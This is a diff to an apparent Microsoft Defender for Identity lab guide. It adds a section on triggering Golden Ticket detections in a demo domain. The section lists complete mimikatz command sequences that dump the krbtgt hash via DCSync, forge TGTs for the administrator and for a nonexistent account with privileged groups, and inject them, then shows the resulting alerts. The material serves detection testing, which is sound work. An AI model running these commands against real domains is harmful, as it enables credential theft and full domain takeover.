@@ -348,9 +348,32 @@ Keep in mind that MDI can also track files uploaded from workstation or server t
 
 ![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image32.png)  
 
-## 19 - Suspected Golden Ticket usage (nonexistent account) & (Time anomaly) & (encryption downgrade) etc..
-MDI can detect 6 types of Golden Ticket attack; let see 3 of them. 
+## 19 - Suspected Golden Ticket usage (encryption downgrade) & (nonexistent account) & (Time anomaly) etc..
+MDI can detect 6 types of Golden Ticket attack; let see 3 of them. Using the krbtgt's password hash from the DCsync; attackers can now create a Kerberos ticket granting ticket (TGT) that provides authorization to any resource and set the ticket expiration to any arbitrary time. This fake TGT is called a "Golden Ticket" and allows attackers to achieve network persistence.  
 
+From a command line run with local admin account on workstation:  
+
+*mimikatz # privilege::debug*  
+*mimikatz # lsadump::dcsync /domain:msdemo.local /user:krbtgt*  => to get the krbgt's password hash needed for the /rc4:...  
+*mimikatz # Kerberos::golden /domain:msdemo.local /sid:S-1-5-21-4112553867-xxxxxxxxxxxx /rc4:xxxxxxxxxxxxxxx /user:administrator /id:500 /groups:513,512,520,518,519 /ticket:administrator.kirbi* => create a fake TGT for the default administrator account (RID=500) and add sensitives RID groups  
+*mimikatz # kerberos::ptt administrator.kirbi* => load the fake TGT  
+*mimikatz #	misc::cmd* => open a cmd  
+*klist* => check if the TGT is loaded  
+*ldp.exe* => then bind (digest) to an ldap server to use the fake TGT for encryption downgrade detection
+
+*mimikatz # privilege::debug* 
+*mimikatz # lsadump::dcsync /domain:msdemo.local /user:krbtgt*  => to get the krbgt's password hash needed for the /rc4:...  
+*mimikatz # Kerberos::golden /domain:msdemo.local /sid:S-1-5-21-4112553867-xxxxxxxxxxxx /rc4:xxxxxxxxxxxxxxx /user:XYZ /id:500 /groups:513,512,520,518,519,1107 /ticket:XYZ.kirbi => create a fake TGT for the nonexistent account and add sensitives RID groups (valid for 2àmn)
+*mimikatz # kerberos::ptt XYZ.kirbi* => load the fake TGT  
+*klist* => check if the TGT is loaded  
+*ldp.exe* => then bind (digest) to an ldap server to use the fake TGT for nonexistent account detection  
+
+Tools available from : https://github.com/gentilkiwi/mimikatz/releases  
+
+Detail in the alert :  
+
+![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image34.png)  
+![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image35.png)  
 
 ## 20 - Suspicious additions to sensitive groups
 Attackers could add users to highly privileged groups to gain access to more resources, and gain persistency. This alert needs a machine learning period (such as : this user usually does not perform this addition to sensitive groups...etc).
